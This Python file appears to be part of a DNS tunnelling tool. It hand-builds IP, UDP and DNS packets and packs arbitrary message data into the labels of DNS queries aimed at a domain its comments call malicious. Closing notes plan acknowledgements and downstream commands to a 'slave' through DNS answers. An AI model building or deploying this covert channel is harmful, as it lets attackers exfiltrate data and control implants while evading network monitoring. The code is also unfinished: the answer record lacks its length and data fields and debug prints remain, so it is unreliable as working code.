def ip_header_create(src :bytearray, dst :bytearray, length :bytearray):
    ip_header=bytearray()
    """            0                   1                   2                   3
                0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
               |Version|  IHL  |Type of Service|          Total Length         |
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ """
    ip_header =    b'\x45'     +    b'\x00'    + length.to_bytes(2, byteorder="big")
    """        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
               |         Identification        |Flags|      Fragment Offset    |
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ """
    ip_header +=   b'\x00'     +    b'\x00'    + b'\x00'    +    b'\x00'       #id set by host IP_HDRINCL
    """        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
               |  Time to Live |    Protocol   |         Header Checksum       |
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ """
    ip_header +=   b'\xff'     +   b'\x11'     +       b'\x00'     +     b'\x00'#255 ttl, 0x11=UDP, checksum set by host IP_HDRINCL(not being done) 
    """        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
               |                       Source Address                          |
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ """
    ip_header +=                            src
    """        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
               |                    Destination Address                        |
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ """
    ip_header +=                            dst
    return ip_header


"""    
                            0      7 8     15 16    23 24    31
                            +--------+--------+--------+--------+
                            |     Source      |   Destination   |
                            |      Port       |      Port       |
                            +--------+--------+--------+--------+
                            |                 |                 |
                            |     Length      |    Checksum     |
                            +--------+--------+--------+--------+
                            |
                            |          data octets ...
                            +---------------- ...
"""
def udp_header_create(src_port :bytearray, dst_port :bytearray, length :int):
    udp_header =  bytearray()
    udp_header =  src_port                               # add the source port to the header
    udp_header += dst_port                               # add the destination port to the header
    udp_header += length.to_bytes(2, byteorder="big")    # convert the length to big endian and add it to the header
    udp_header += b'\x00\x00'                            # An all zero transmitted checksum value means that -
    return udp_header                                    # - the transmitter generated no checksum

def dns_header_create(id :int, r :str, rcode :str):
    dns_header = bytearray()
    """                                                    1  1  1  1  1  1
                          0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
                        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                        |                      ID                       |
                        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    dns_header =                 id.to_bytes(2, byteorder="big")
    """                 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                        |QR|   Opcode  |AA|TC|RD|RA|    Z   |   RCODE   |
                        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    dns_header += int(   r  + '0000' + r + '0''1' + r + '000'  +  rcode ,2).to_bytes(2, byteorder="big")
    """                 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                        |                    QDCOUNT                    |
                        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    dns_header +=                              b'\x00\x01'                    #Bind rejects anything !=1
    """                 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                        |                    ANCOUNT                    |
                        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    dns_header +=                            b'\x00\x00'
    """                 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                        |                    NSCOUNT                    |
                        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    dns_header +=                            b'\x00\x00'
    """                 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                        |                    ARCOUNT                    |
                        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    dns_header +=                            b'\x00\x00'
    return dns_header
    
def dns_query_create(message :str, domain :bytearray):
    query = bytearray()
    """                                                 1  1  1  1  1  1
                       0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
                    Q--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--Q
                    N F| T| SeqN| AckN|               DATA          N#F=flag T=ticket
                    A                                               A
                    M                                               M
                    E--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--E"""
    k=1
    while 0<=len(message)-k*63:
        query += b'\x3f'                                    #write max len
        print(message[(k-1)*63:k*63])
        query += bytearray(message[(k-1)*63:k*63], 'idna')  #write message
        k+=1                                                #increment iterator
    query += len(message[(k-1)*63:]).to_bytes(1, byteorder="big")    #get length of extra bits
    print(message[(k-1)*63:k*63])
    query += bytearray(message[(k-1)*63:], 'idna')                    #append the extra bits encoded
    query += domain                                                   #malicous domain used for query
    query +=                              b'\x00'                     #null terminator
    """             +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    |                     QTYPE                     |
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    query +=                             b'\x00\x01'                    # A record
    """             +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    |                     QCLASS                    |
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    query +=                             b'\x00\x01'                    # internet
    return query
    
def dns_answer_create(domain :bytearray):
    answer = bytearray()
    """                                             1  1  1  1  1  1
                      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    |                                               |
                    /                                               /
                    /                      NAME                     /
                    |                                               |
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    answer =                              domain        
    """             +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    |                      TYPE                     |
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    answer +=                           b'\x00\x01'                    # A record
    """             +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    |                     CLASS                     |
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    answer +=                           b'\x00\x01'                    # IN class
    """             +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    |                      TTL                      |
                    |                                               |
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    answer +=                       b'\x00\x00\x00\x00'                #TTL 0 = do not cache
    """             +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    |                   RDLENGTH                    |
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|"""

    """             +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                    /                     RDATA                     /
                    /                                               /
                    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+"""
    return     answer        


#create a cache for retransmission
#store message offset in array, pop off value when it receivces a reply, check every 2-5 sec for ans or resend, calc resend based off offset
#use dns answers as confirmation of packet receivement
#minimum retransmission interval should be 2-5 seconds -RFC 1035

#. breaks idna encoding \. fixes it?


#send reverse queries to send data down ie: have slave ask for an ip and give data based off the ans